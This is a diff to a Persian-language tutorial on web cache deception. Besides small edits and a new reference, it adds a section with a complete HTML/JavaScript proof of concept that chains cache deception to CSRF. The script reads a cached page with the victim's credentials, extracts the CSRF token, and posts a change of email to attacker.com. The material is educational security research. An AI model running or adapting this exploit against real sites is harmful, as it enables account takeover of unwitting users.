@@ -141,7 +141,7 @@ data.json</pre>
 | --- | --- |
 | /profile;test | /profile |
 
-### CacheServer Delimiter
+### Cache Server Delimiter
 
 <p dir="rtl">جداکننده(Delimiter) سرور کش، به کاراکتری گفته می‌شه که توسط سرور کش به عنوان جداکننده در نظر گرفته می‌شه. برای مثال اگه کاراکتر ; توسط سرور کش به عنوان جداکننده در نظر گرفته بشه:</p>
 <p dir="rtl"> </p>
@@ -308,6 +308,41 @@ config.json
 data.json
 </pre>
 
+# Cashe Deceptin to CSRF in a single click!
+
+<p dir="rtl">اگه بتونیم با استفاده از کش دیسپشن، محتوایی که شامل CSRF token هست رو به صورت عمومی کش کنیم، می‌تونیم خیلی راحت ازش توی حمله CSRF استفاده کنیم.</p>
+<p dir="rtl">اول میایم یه URL درست می‌کنیم (مثلاً با یه پسوند مثل .css یا .jpg) که باعث بشه پاسخ HTML از سرور بیاد، ولی توسط CDN یا سرور کش به عنوان یه فایل استاتیک کش بشه.</p>
+<p dir="rtl">بعد، وقتی قربانی روی لینک ما کلیک کنه، جاوااسکریپت ما اون URL کش‌شده رو با fetch لود می‌کنه، محتوای HTML رو می‌خونه و با regex توکن CSRF رو درمیاره.</p>
+<p dir="rtl">همون‌جا توی همون اسکریپت، بلافاصله یه درخواست POST به مسیر حساس می‌زنیم و توکن رو توی بدنه درخواست قرار می‌دیم — یعنی حمله CSRF انجام میشه، بدون اینکه قربانی چیزی بفهمه.</p>
+<p dir="rtl">!!! این تکنیک وقتی جواب میده که کش، پاسخ HTML حاوی توکن رو برای URL جعلی ذخیره کنه، ولی خود سرور همچنان همون توکن واقعی رو داخلش بذاره. یعنی ترکیب اشتباه بین رفتار سرور اصلی و رفتار سرور کش !!!</p>
+
+```html
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>!!! Cashe Deceptin to CSRF in a single click !!!</h2>
+    <script>
+      fetch('https://victim.com/profile.css', { credentials: 'include' })
+        .then(res => res.text())
+        .then(body => {
+          const tokenMatch = body.match(/name="csrf"\s+value="([^"]+)"/i);
+          if (!tokenMatch) return;
+
+          const token = tokenMatch[1];
+          fetch('https://victim.com/change-email', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: `email=evil@attacker.com&csrf=${token}`
+          });
+        });
+    </script>
+  </body>
+</html>
+```
+
 # Tips
 
 ## 1.
@@ -325,7 +360,7 @@ data.json
 
 ## 3.
 
-<p dir="rtl">موقع تست چون ممکنه درخواست‌هامون کش بشن و اذیت کننده بشه، از اکستنشن Cash Buster می‌شه استفاده کرد. این اکستنشن یه سری کوئری رندوم آخر درخواست قرار می‌ده تا هر سری یه Cashe Key جدید ساخته شه</p>
+<p dir="rtl">مموقع تست چون ممکنه درخواست‌هامون کش بشن و اذیت کننده بشه، از اکستنشن Cash Buster می‌شه استفاده کرد. این اکستنشن یه سری کوئری رندوم آخر درخواست قرار می‌ده تا هر سری یه Cashe Key جدید ساخته شه</p>
 <p dir="rtl"> </p>
 <p dir="rtl"> </p>
 
@@ -336,3 +371,5 @@ data.json
 2. [Web Cache Deception Escalates](https://www.usenix.org/system/files/sec22-mirheidari.pdf)
   
 3. [bending the rules of web cache exploitation](https://portswigger.net/kb/papers/kapvrid/gotta-cache-em-all.pdf)
+  
+4. [A web cache deception chained to a CSRF, the recipe]([A web cache deception chained to a CSRF, the recipe - zhero_web_security](https://zhero-web-sec.github.io/cache-deception-to-csrf/))
